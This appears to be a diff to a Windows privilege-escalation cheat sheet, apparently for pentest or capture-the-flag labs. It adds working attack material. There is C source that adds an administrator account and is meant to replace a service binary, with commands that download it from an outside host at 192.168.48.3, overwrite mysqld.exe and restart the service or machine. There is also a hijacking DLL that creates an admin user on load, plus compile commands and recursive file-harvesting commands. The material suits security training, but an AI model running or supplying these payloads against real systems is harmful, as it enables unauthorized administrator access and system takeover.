@@ -1,3 +1,15 @@
+# Information Gathering
+
+## Installed applications
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+
+
+## Find the path of a running process
+
+
 https://superuser.com/questions/768984/show-exe-file-path-of-running-processes-on-the-command-line-in-windows
 ```
 
@@ -36,6 +48,9 @@ PS C:\Users\mac\AppData\Roaming\SuperCompany>
 
 Get noteworthy files:
 `Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` 
+
+Get flag file:
+`Get-ChildItem -Path C:\Users\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue` 
 
 ## Find Powershell History
 ```powershell
@@ -109,10 +124,90 @@ PowerUp will also suggest potential privilege escalation vectors based on the fi
 Install-ServiceBinary -Name LaDEEDah
 ```
 
+### Replace the binary of a service with a malicious one to escalate privileges. 
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+Compile it with:
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+Then you can copy the binary to the target machine and replace the binary of a service with it. When the service is restarted, it will execute your malicious binary, adding a new user with administrative privileges.
+```powershell
+iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+```
+Try to stop the service and start it again to trigger the execution of your malicious binary.
+```powershell
+net stop mysql
+net start mysql
+```
+If you cant stop the service, you can try to restart the machine to trigger the execution of your malicious binary.
+```powershell
+shutdown /r /t 0
+```
 
 ## Run application as a specific user using `runas` command
 The `runas` command allows you to run a program as a different user. 
 
 ```powershell
 runas /user:Administrator "C:\Path\To\Application.exe"
+```
+
+## DLL Hijacking
+Thanks to DLL Searchorder you can hijack a DLL that is loaded by a program. If you can place a malicious DLL in the same directory as the executable, it will be loaded instead of the legitimate one.
+
+Oder of searching for DLLs in Windows:
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+Windows first searches the application's directory. Interestingly, the current directory is at position 5. When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
+
+### Create dll to add a user
+```cpp
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+Compile it with:
+```bash
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 ```
